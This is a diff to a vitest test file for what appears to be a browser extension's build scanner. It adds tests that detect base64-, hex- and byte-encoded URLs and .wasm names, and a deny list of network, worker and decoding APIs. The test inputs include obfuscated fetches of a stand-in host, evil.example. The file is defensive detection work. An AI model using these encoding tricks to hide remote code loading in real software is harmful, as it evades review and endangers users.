@@ -2,6 +2,8 @@ import { describe, expect, it } from 'vitest';
 import { randomBytes } from 'node:crypto';
 import {
   ALLOWED_ORIGINS,
+  forbiddenNames,
+  hiddenTexts,
   importsRuntime,
   scriptProblems,
   tamperingPrimitives,
@@ -339,5 +341,116 @@ describe('primitives that replace what the runtime relies on, in a built script'
     'Object.getOwnPropertyDescriptor(n,"wasmPaths")',
   ])('lets %s through', (code) => {
     expect(tamperingPrimitives(code), code).toEqual([]);
+  });
+});
+
+// Review round 3 of PR #6: `atob('aHR0cHM6Ly9ldmls...')` and a `.wasm` name in base64 were invisible to the scan, which looked at
+// the spelling of URLs and headers only. A literal that DECODES to one is refused now, at every alignment of the encoding.
+describe('hiddenTexts: a URL or a module that is written in an encoded form', () => {
+  const b64 = (text: string, before = 0): string =>
+    Buffer.from('x'.repeat(before) + text, 'latin1').toString('base64');
+  const b64url = (text: string): string =>
+    Buffer.from(text, 'latin1').toString('base64url').replace(/=+$/, '');
+  const hex = (text: string): string => Buffer.from(text, 'latin1').toString('hex');
+  const bytes = (text: string): string => [...Buffer.from(text, 'latin1')].join(',');
+
+  it.each([
+    ['base64 of an https URL', `fetch(atob("${b64('https://evil.example/ort/')}"))`],
+    ['base64 of an http URL', `x("${b64('http://127.0.0.1:8000/b.wasm')}")`],
+    ['base64 of a protocol-relative URL', `x("${b64('//evil.example/b')}")`],
+    ['base64 of a .wasm name', `x("${b64('ort-wasm-simd-threaded.wasm')}")`],
+    ['base64 of a name with a query', `x("${b64('b.wasm?v=2')}")`],
+    ['base64url', `x("${b64url('https://evil.example/?a=b>c')}")`],
+    ['base64 after one filler byte', `x("${b64('https://evil.example/', 1)}")`],
+    ['base64 after two filler bytes', `x("${b64('https://evil.example/', 2)}")`],
+    ['base64 after three filler bytes', `x("${b64('https://evil.example/', 3)}")`],
+    [
+      'base64 with other text around it in the literal',
+      `x("data:;base64,${b64('https://evil.example/')}")`,
+    ],
+    ['hex of a URL', `x("${hex('https://evil.example/')}")`],
+    ['hex of a .wasm name', `x("${hex('a.wasm')}")`],
+    ['a list of bytes of a URL', `new Uint8Array([${bytes('https://evil.example/')}])`],
+    ['a list of bytes of a .wasm name', `x([${bytes('b.wasm')},0])`],
+    ['a template literal', 'x(`' + b64('https://evil.example/') + '`)'],
+    [
+      'an escaped base64 literal',
+      `x("${b64('https://evil.example/').replace(/^./, (c) => `\\x${c.charCodeAt(0).toString(16)}`)}")`,
+    ],
+  ])('finds %s', (_what, code) => {
+    expect(hiddenTexts(code), code).not.toEqual([]);
+    expect(scriptProblems('assets/result-abc.js', code).join('\n'), code).toMatch(/decodes to/);
+  });
+
+  it.each([
+    ['base64 of an allowed host', `x("${b64('https://fonts.googleapis.com/css2')}")`],
+    ['base64 of plain words', `x("${b64('Refusing to start: proxy must be true')}")`],
+    ['an identifier-like word', 'x("getOwnPropertyDescriptor"); y("Uint8ClampedArray")'],
+    ['a camel-case name', 'const n = "createImageBitmapWithOptions"'],
+    ['hex that is not text', 'const h = "00ff00ff00ff00ff00ff00ff"'],
+    ['a short list of numbers', 'const a = [104, 116, 116, 112]'],
+    ['numbers with a fraction', 'const m = [0.485, 0.456, 0.406, 1, 2, 3, 4, 5, 6, 7, 8]'],
+    ['long numbers of the model', 'const v = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000]'],
+  ])('does not mistake %s for a hidden URL', (_what, code) => {
+    expect(hiddenTexts(code), code).toEqual([]);
+  });
+
+  it('accepts the build of the extension as it is', () => {
+    expect(hiddenTexts(REAL_CHUNK)).toEqual([]);
+  });
+});
+
+describe('forbiddenNames: what no script of the build uses', () => {
+  it.each([
+    'XMLHttpRequest',
+    'WebSocket',
+    'EventSource',
+    'sendBeacon',
+    'importScripts',
+    'SharedWorker',
+    'Worker',
+    'BroadcastChannel',
+    'MessageChannel',
+    'postMessage',
+    'TextDecoder',
+    'atob',
+    'unescape',
+    'decodeURI',
+    'fromCodePoint',
+    'webdriver',
+    'setResourceTimingBufferSize',
+    'clearResourceTimings',
+    'WebAssembly',
+    'instantiateStreaming',
+    'compileStreaming',
+  ])('refuses %s', (name) => {
+    for (const code of [`${name}(x)`, `new ${name}("a")`, `a.${name}(1)`, `a["${name}"]`]) {
+      expect(forbiddenNames('assets/result-abc.js', code), code).toContain(name);
+      expect(forbiddenNames('background.js', code), code).toContain(name);
+    }
+  });
+
+  it('refuses a dynamic import() and the words inside a longer name only when they stand alone', () => {
+    expect(forbiddenNames('assets/a.js', 'import ( u )')).toEqual(['import(']);
+    expect(forbiddenNames('assets/a.js', 'const y = import(u)')).toEqual(['import(']);
+    expect(
+      forbiddenNames('assets/a.js', 'decodeURIComponent(s); myWorkerCount; atoms; webdrivers'),
+    ).toEqual([]);
+  });
+
+  it('lets only the service worker encode the screenshot with btoa and fromCharCode', () => {
+    expect(forbiddenNames('background.js', 'btoa(String.fromCharCode(...b))')).toEqual([]);
+    expect(forbiddenNames('assets/result-abc.js', 'btoa(String.fromCharCode(...b))')).toEqual([
+      'btoa',
+      'fromCharCode',
+    ]);
+    expect(forbiddenNames('select.js', 'btoa(x)')).toEqual(['btoa']);
+    expect(forbiddenNames('assets/background-abc.js', 'btoa(x)')).toEqual(['btoa']);
+  });
+
+  it('is part of the problems of a script, with the file named', () => {
+    expect(scriptProblems('assets/result-abc.js', 'new Worker(u)').join('\n')).toContain(
+      'assets/result-abc.js: uses Worker',
+    );
   });
 });
